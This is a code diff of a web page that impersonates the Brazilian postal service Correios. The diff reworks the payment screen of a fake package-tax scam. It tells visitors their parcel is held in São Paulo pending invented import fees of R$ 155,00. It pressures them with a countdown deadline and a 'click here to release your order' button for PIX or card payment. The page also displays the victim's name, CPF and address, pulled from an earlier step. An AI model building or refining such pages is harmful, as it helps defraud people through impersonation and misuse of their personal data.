@@ -121,7 +121,7 @@
     }
 
     main {
-      max-width: 700px;
+      max-width: 900px;
       margin: 2rem auto;
       padding: 0 1rem;
       text-align: center;
@@ -220,10 +220,10 @@
     #pagamento {
       background: #ffffff;
       border-radius: 8px;
-      padding: 2rem;
+      padding: 2.5rem;
       font-family: Arial, sans-serif;
       text-align: left;
-      max-width: 800px;
+      max-width: 900px;
       margin: 2rem auto;
       display: none;
     }
@@ -430,47 +430,12 @@
       margin: 5px 0;
     }
     
-    /* Novo estilo para a tela de pagamento */
-    .payment-header {
-      text-align: center;
-      margin-bottom: 2rem;
-    }
-    
-    .payment-alert {
-      background-color: #fff3cd;
-      border-left: 4px solid #ffc107;
-      padding: 1rem;
-      margin-bottom: 2rem;
-      text-align: center;
-    }
-    
-    .payment-status {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 1.5rem;
-    }
-    
-    .payment-status-icon {
-      width: 16px;
-      height: 16px;
-      background-color: #ffc107;
-      border-radius: 50%;
-      margin-right: 10px;
-      animation: blink 1.5s infinite;
-    }
-    
-    @keyframes blink {
-      0% { opacity: 1; }
-      50% { opacity: 0.5; }
-      100% { opacity: 1; }
-    }
-    
-    .payment-details {
+    /* Novo layout expandido para a tela de pagamento */
+    .payment-container {
       display: flex;
       flex-wrap: wrap;
-      gap: 2rem;
-      margin-bottom: 2rem;
+      gap: 20px;
+      margin-top: 20px;
     }
     
     .payment-info {
@@ -478,78 +443,136 @@
       min-width: 300px;
     }
     
-    .payment-timeline {
+    .payment-status {
       flex: 1;
       min-width: 300px;
     }
     
-    .timeline-item {
-      display: flex;
-      margin-bottom: 1.5rem;
-      position: relative;
+    .payment-box {
+      background-color: #f8f9fa;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 20px;
     }
     
-    .timeline-icon {
-      width: 50px;
-      height: 50px;
-      background-color: #f0f0f0;
+    .payment-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+    
+    .payment-icon {
+      width: 40px;
+      height: 40px;
+      background-color: #e9ecef;
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      margin-right: 1rem;
-      flex-shrink: 0;
+      margin-right: 15px;
+    }
+    
+    .payment-title {
+      font-weight: bold;
+      color: #003157;
+      font-size: 16px;
+    }
+    
+    .payment-content {
+      margin-left: 55px;
+    }
+    
+    .payment-timeline {
+      position: relative;
+      padding-left: 55px;
+    }
+    
+    .payment-timeline::before {
+      content: "";
+      position: absolute;
+      left: 27px;
+      top: 0;
+      bottom: 0;
+      width: 2px;
+      background-color: #ffd500;
+    }
+    
+    .timeline-item {
+      position: relative;
+      margin-bottom: 30px;
+    }
+    
+    .timeline-item:last-child {
+      margin-bottom: 0;
+    }
+    
+    .timeline-icon {
+      position: absolute;
+      left: -55px;
+      top: 0;
+      width: 40px;
+      height: 40px;
+      background-color: #e9ecef;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1;
     }
     
     .timeline-content {
+      padding-top: 5px;
+    }
+    
+    .timeline-title {
+      font-weight: bold;
+      color: #003157;
+      margin-bottom: 5px;
+    }
+    
+    .box-container {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      margin-top: 20px;
+    }
+    
+    .box-image {
       flex: 1;
-    }
-    
-    .timeline-connector {
-      position: absolute;
-      left: 24px;
-      top: 50px;
-      bottom: -20px;
-      width: 2px;
-      background-color: #ffc107;
-    }
-    
-    .payment-box {
-      background-color: #f8f9fa;
-      border: 1px solid #dee2e6;
-      border-radius: 8px;
-      padding: 1.5rem;
-      margin-top: 2rem;
+      min-width: 300px;
       position: relative;
-      text-align: center;
+      background-color: #f8f9fa;
+      border-radius: 8px;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 300px;
     }
     
-    .box-overlay {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 80%;
-      text-align: left;
+    .box-details {
+      flex: 1;
+      min-width: 300px;
     }
     
-    .box-overlay p {
-      margin: 0.5rem 0;
-      font-size: 12px;
+    .box-details-item {
+      margin-bottom: 15px;
+    }
+    
+    .box-details-title {
       font-weight: bold;
-      color: #333;
+      color: #003157;
+      margin-bottom: 5px;
     }
     
-    .payment-footer {
-      text-align: center;
-      margin-top: 2rem;
+    .blink {
+      animation: blink 1.5s infinite;
     }
     
-    .payment-urgency {
-      color: #dc3545;
-      font-weight: bold;
-      margin: 1rem 0;
-      text-align: center;
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.5; }
+      100% { opacity: 1; }
     }
   </style>
 </head>
@@ -626,99 +649,137 @@
       </div>
     </section>
 
-    <!-- Tela Pagamento - Versão Otimizada -->
+    <!-- Tela Pagamento expandida -->
     <section id="pagamento">
-      <div class="payment-header">
-        <h2 class="blue-dark-text">Portal Correios › Rastreamento › <span class="cpf"></span></h2>
-      </div>
-      
-      <div class="payment-alert">
-        <h3 class="alert-title">SUA ENCOMENDA FOI TRIBUTADA!</h3>
-      </div>
-      
-      <div class="payment-status">
-        <div class="payment-status-icon" id="blink"></div>
-        <h3 class="status-value">AGUARDANDO SUA CONFIRMAÇÃO</h3>
-      </div>
-      
-      <p class="text-center" style="color:#555577;">Sua encomenda está retida na agência dos Correios em <span id="pag-cidade"></span></p>
-      
-      <div class="payment-urgency">
-        <p>⚠️ ATENÇÃO: Você tem apenas <span id="countdown">24 horas</span> para regularizar sua situação!</p>
-      </div>
-      
-      <div class="payment-details">
+      <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
+        <span class="text-blue mr-2">Portal Correios</span>
+        <i class="fal fa-angle-right mr-2"></i>
+        <span class="text-blue mr-2">Rastreamento</span>
+        <i class="fal fa-angle-right mr-2"></i>
+        <span class="text-blue mr-2"><span class="cpf"></span></span>
+      </nav>
+
+      <div class="payment-container">
         <div class="payment-info">
-          <h4 class="blue-dark-text">DETALHES DO PEDIDO</h4>
-          <p><strong>Nome:</strong> <span id="pag-nome"></span></p>
-          <p><strong>CPF:</strong> <span id="pag-cpf"></span></p>
-          <p><strong>CEP:</strong> <span id="pag-cep"></span></p>
-          <p><strong>Cidade/Estado:</strong> <span id="pag-cidade-estado"></span></p>
-          
+          <div class="payment-box">
+            <div class="payment-header">
+              <div class="payment-icon">
+                <i class="fas fa-exclamation-triangle text-danger"></i>
+              </div>
+              <div class="payment-title">SUA ENCOMENDA FOI TRIBUTADA!</div>
+            </div>
+            <div class="payment-content">
+              <p>Sua encomenda está retida na agência dos Correios em São Paulo devido a pendências fiscais. Para liberação, é necessário regularizar a situação.</p>
+            </div>
+          </div>
+
+          <div class="payment-box">
+            <div class="payment-header">
+              <div class="payment-icon">
+                <i class="fas fa-info-circle text-primary"></i>
+              </div>
+              <div class="payment-title">DETALHES DA TAXAÇÃO</div>
+            </div>
+            <div class="payment-content">
+              <p><strong>Motivo:</strong> Mercadoria importada sujeita a tributação</p>
+              <p><strong>Valor declarado:</strong> R$ 350,00</p>
+              <p><strong>Taxa de importação:</strong> R$ 87,50 (25%)</p>
+              <p><strong>ICMS:</strong> R$ 52,50 (15%)</p>
+              <p><strong>Taxa administrativa:</strong> R$ 15,00</p>
+              <p><strong>Total a pagar:</strong> <span class="text-danger font-weight-bold">R$ 155,00</span></p>
+            </div>
+          </div>
+
           <div class="payment-button-container">
-            <button id="btn-pagar" class="btn btn-primary">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
+            <button id="btn-pagar" class="btn btn-primary btn-block">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
+            <p class="text-center mt-2">Pagamento seguro via PIX ou Cartão de Crédito</p>
+          </div>
+        </div>
+
+        <div class="payment-status">
+          <div class="payment-box">
+            <div class="payment-header">
+              <div class="payment-icon">
+                <i class="fas fa-truck text-warning"></i>
+              </div>
+              <div class="payment-title">STATUS DA ENTREGA</div>
+            </div>
+            <div class="payment-timeline">
+              <div class="timeline-item">
+                <div class="timeline-icon">
+                  <i class="fas fa-exclamation-circle text-warning blink"></i>
+                </div>
+                <div class="timeline-content">
+                  <div class="timeline-title">AGUARDANDO SUA CONFIRMAÇÃO</div>
+                  <p>Sua encomenda está retida na unidade de fiscalização em São Paulo</p>
+                </div>
+              </div>
+              
+              <div class="timeline-item">
+                <div class="timeline-icon">
+                  <i class="fas fa-truck"></i>
+                </div>
+                <div class="timeline-content">
+                  <div class="timeline-title">OBJETO EM TRANSFERÊNCIA</div>
+                  <p>Por favor aguarde</p>
+                </div>
+              </div>
+              
+              <div class="timeline-item">
+                <div class="timeline-icon">
+                  <i class="fas fa-box"></i>
+                </div>
+                <div class="timeline-content">
+                  <div class="timeline-title">OBJETO POSTADO</div>
+                  <p>Origem: China</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="box-container">
+        <div class="box-image">
+          <div class="overlay">
+            <div class="overlay-text">
+              <p class="rotate"> 
+                NOME: <span id="pag-nome"></span><br>
+                CPF: <span id="pag-cpf"></span><br>
+                CEP: <span id="pag-cep"></span><br>
+                CIDADE: <span id="pag-cidade"></span><br>
+                ESTADO: <span id="pag-estado"></span>
+              </p>
+            </div>
           </div>
         </div>
         
-        <div class="payment-timeline">
-          <h4 class="blue-dark-text">HISTÓRICO DE ENTREGA</h4>
-          
-          <div class="timeline-item">
-            <div class="timeline-icon">
-              <img src="images/correios-icon-1.png" alt="" width="24">
-            </div>
-            <div class="timeline-content">
-              <h5 class="blue-dark-text">Previsão de Entrega</h5>
-              <p>3 dias após o pagamento</p>
-            </div>
-            <div class="timeline-connector"></div>
+        <div class="box-details">
+          <div class="box-details-item">
+            <div class="box-details-title">PREVISÃO DE ENTREGA</div>
+            <p>3 dias úteis após a confirmação do pagamento</p>
           </div>
           
-          <div class="timeline-item">
-            <div class="timeline-icon">
-              <i class="fas fa-dollar-sign"></i>
-            </div>
-            <div class="timeline-content">
-              <h5 class="blue-dark-text">Objeto aguardando sua confirmação</h5>
-              <p>em Unidade de Fiscalização em <span id="timeline-city"></span></p>
-            </div>
-            <div class="timeline-connector"></div>
+          <div class="box-details-item">
+            <div class="box-details-title">LOCAL DE RETENÇÃO</div>
+            <p>Centro de Distribuição Internacional - São Paulo/SP</p>
           </div>
           
-          <div class="timeline-item">
-            <div class="timeline-icon">
-              <i class="fas fa-truck"></i>
-            </div>
-            <div class="timeline-content">
-              <h5 class="blue-dark-text">Objeto em transferência</h5>
-              <p>Por favor aguarde</p>
-            </div>
-            <div class="timeline-connector"></div>
+          <div class="box-details-item">
+            <div class="box-details-title">PRAZO PARA REGULARIZAÇÃO</div>
+            <p id="pag-prazo"></p>
           </div>
           
-          <div class="timeline-item">
-            <div class="timeline-icon">
-              <i class="fas fa-box"></i>
-            </div>
-            <div class="timeline-content">
-              <h5 class="blue-dark-text">Objeto Postado</h5>
-            </div>
+          <div class="box-details-item">
+            <div class="box-details-title">ATENDIMENTO</div>
+            <p>Disponível de segunda a sexta, das 8h às 18h</p>
+            <p>Telefone: 3003-0100 (Capitais e Regiões Metropolitanas)</p>
           </div>
         </div>
       </div>
-      
-      <div class="payment-box">
-        <img src="images/Caixa.png" alt="Caixa de encomenda" style="max-width: 100%; opacity: 0.7;">
-        <div class="box-overlay">
-          <p>NOME: <span id="box-nome"></span></p>
-          <p>CPF: <span id="box-cpf"></span></p>
-          <p>CEP: <span id="box-cep"></span></p>
-          <p>CIDADE: <span id="box-cidade"></span></p>
-        </div>
-      </div>
-      
-      <div class="payment-footer">
-        <a href="#" id="voltar-rastreio" class="btn btn-link">Voltar ao rastreamento</a>
+
+      <div class="btn-container">
+        <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
       </div>
     </section>
 
@@ -792,6 +853,7 @@
       const diffMs = fimDoDia - agora;
       if (diffMs <= 0) {
         document.getElementById("res-prazo").textContent = "Prazo expirado";
+        document.getElementById("pag-prazo").textContent = "Prazo expirado";
         clearInterval(intervalContagem);
         return;
       }
@@ -804,17 +866,10 @@
       const mm = (agora.getMonth() + 1).toString().padStart(2, "0");
       const yyyy = agora.getFullYear();
 
-      document.getElementById("res-prazo").textContent = `${dd}/${mm}/${yyyy} às 23:59 (Tempo restante: ${horas}h ${minutos}m ${segundos}s)`;
+      const prazoText = `${dd}/${mm}/${yyyy} às 23:59 (Tempo restante: ${horas}h ${minutos}m ${segundos}s)`;
       
-      // Atualiza também o contador na tela de pagamento
-      document.getElementById("countdown").textContent = `${horas}h ${minutos}m ${segundos}s`;
-    }
-
-    function atualizarInfoCaixa(dados) {
-      document.getElementById("box-nome").textContent = dados.nome;
-      document.getElementById("box-cpf").textContent = dados.cpf;
-      document.getElementById("box-cep").textContent = dados.cep;
-      document.getElementById("box-cidade").textContent = dados.cidade;
+      document.getElementById("res-prazo").textContent = prazoText;
+      document.getElementById("pag-prazo").textContent = prazoText;
     }
 
     let intervalContagem;
@@ -873,9 +928,6 @@
         document.getElementById("tela-formulario").style.display = "none";
         document.getElementById("resultado").style.display = "block";
 
-        // Atualiza informações na caixa
-        atualizarInfoCaixa(dadosPessoa);
-
         // Inicia a contagem regressiva imediatamente
         atualizarContagemRegressiva();
         intervalContagem = setInterval(atualizarContagemRegressiva, 1000);
@@ -887,24 +939,12 @@
       document.getElementById("pagamento").style.display = "block";
       
       // Transfere os dados para a tela de pagamento
-      const nome = document.getElementById("res-nome").textContent;
-      const cpf = document.getElementById("res-cpf").textContent;
-      const cep = document.getElementById("res-cep").textContent;
-      const cidade = document.getElementById("res-cidade").textContent;
-      const estado = document.getElementById("res-estado").textContent;
-      
-      document.getElementById("pag-nome").textContent = nome;
-      document.getElementById("pag-cpf").textContent = cpf;
-      document.getElementById("pag-cep").textContent = cep;
-      document.getElementById("pag-cidade").textContent = cidade;
-      document.getElementById("pag-cidade-estado").textContent = `${cidade}/${estado}`;
-      document.getElementById("timeline-city").textContent = cidade;
-      
-      // Atualiza também os dados na caixa
-      document.getElementById("box-nome").textContent = nome;
-      document.getElementById("box-cpf").textContent = cpf;
-      document.getElementById("box-cep").textContent = cep;
-      document.getElementById("box-cidade").textContent = cidade;
+      document.getElementById("pag-nome").textContent = document.getElementById("res-nome").textContent;
+      document.getElementById("pag-cpf").textContent = document.getElementById("res-cpf").textContent;
+      document.getElementById("pag-cep").textContent = document.getElementById("res-cep").textContent;
+      document.getElementById("pag-cidade").textContent = document.getElementById("res-cidade").textContent;
+      document.getElementById("pag-estado").textContent = document.getElementById("res-estado").textContent;
+      document.getElementById("pag-prazo").textContent = document.getElementById("res-prazo").textContent;
     });
 
     // Script para o link "não sou eu"
@@ -914,7 +954,7 @@
       window.close();
     });
     
-    // Script para o link "voltar ao rastreamentoo"
+    // Script para o link "voltar ao rastreamento"
     document.getElementById("voltar-rastreio").addEventListener("click", function(e) {
       e.preventDefault();
       document.getElementById("pagamento").style.display = "none";
